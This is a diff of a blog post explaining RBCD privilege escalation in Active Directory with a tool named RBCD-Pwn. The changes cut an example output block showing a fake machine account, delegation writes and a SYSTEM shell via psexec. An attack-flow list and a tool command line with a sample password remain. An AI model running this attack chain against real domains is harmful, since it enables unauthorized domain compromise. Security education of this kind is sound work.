@@ -1,9 +1,8 @@
 ---
 title: "Privilege Escalation in Active Directory: RBCD Attack"
 date: 2026-04-09 10:00:00 +0300
-author: false
 categories: [Active Directory, Privilege Escalation]
-tags: [rbcd, kerberos, active-directory, penetration-testing, red-team]
+tags: [rbcd, kerberos, active-directory]
 description: "What is Resource-Based Constrained Delegation, how is it exploited, and a full end-to-end attack chain walk-through using RBCD-Pwn."
 ---
 
@@ -46,8 +45,7 @@ Service X   → S4U2Proxy → uses that TGS to access Service Y
 - **S4U2Self (Service for User to Self):** Allows a service to obtain a service ticket for itself on behalf of an arbitrary user — no user interaction required.
 - **S4U2Proxy (Service for User to Proxy):** Uses the ticket obtained via S4U2Self to access a third service on the user's behalf.
 
-> **Important distinction:** S4U2Self alone does not require the resulting ticket to be "forwardable." When RBCD is configured, the KDC will issue a forwardable ticket during S4U2Self so that S4U2Proxy can proceed — this is the key enabler of the attack.
-{: .prompt-info }
+- **Important distinction:** S4U2Self alone does not require the resulting ticket to be "forwardable." When RBCD is configured, the KDC will issue a forwardable ticket during S4U2Self so that S4U2Proxy can proceed — this is the key enabler of the attack.
 
 ---
 
@@ -199,10 +197,6 @@ python3 rbcd_pwn.py -dc-ip 10.10.10.10 -u burak.dirlik -c 'P@ssw0rd!'
 ### Attack Flow Diagram
 
 ```
-┌─────────────────────────────────────────────────────────────┐
-│                   RBCD-Pwn Attack Chain                     │
-└─────────────────────────────────────────────────────────────┘
-
 Step 0: /etc/hosts → auto-detect domain name + DC hostname
 Step 1: impacket-addcomputer → create DORK$ machine account
 Step 2: LDAP (embedded module) → write msDS-AllowedToActOnBehalfOfOtherIdentity
@@ -211,28 +205,7 @@ Step 4: export KRB5CCNAME → load ticket into environment
 Step 5: impacket-psexec → interactive SYSTEM shell
 ```
 
-### Example Output
-
-```
-[*] RBCD-Pwn - Automated RBCD Attack Tool
-
-[i] Authentication Type: NTLM Hash
-[*] Step 0: Auto-detecting Domain Information...
-[+] Domain detected: domain.local
-[+] DC Hostname detected: TARGETDC
-[*] Step 1: Adding Fake Computer Account...
-[+] Successfully added machine account DORK$ with password Dork123!.
-[*] Step 2: Configuring Delegation Permission (RBCD)...
-[*] Delegation rights modified successfully!
-[+] DORK$ can now impersonate users on TARGETDC$ via S4U2Proxy
-[*] Step 3: Obtaining Administrator Ticket...
-[*] Saving ticket in Administrator@cifs_TARGETDC.domain.local@DOMAIN.LOCAL.ccache
-[*] Step 4: Activating Ticket...
-[*] Step 5: Starting PSEXEC...
-
-C:\Windows\system32> whoami
-nt authority\system
-```
+### Example Usage
 
 Every command executed by the tool is printed with a `[CMD]` label before it runs — full transparency, and a great way to understand each step while it happens.
 
@@ -343,8 +316,9 @@ When applied together, these controls make a successful RBCD attack significantl
 
 ## References
 
-- [Wagging the Dog: Abusing Resource-Based Constrained Delegation — Elad Shamir](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
+
 - [Impacket GitHub](https://github.com/fortra/impacket)
-- [Microsoft: Kerberos Constrained Delegation Overview](https://docs.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
 - [BloodHound Documentation](https://bloodhound.readthedocs.io/)
 - [@tothi — rbcd.py original concept](https://github.com/tothi/rbcd-attack)
+- [Wagging the Dog: Abusing Resource-Based Constrained Delegation — Elad Shamir](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
+- [Microsoft: Kerberos Constrained Delegation Overview](https://docs.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
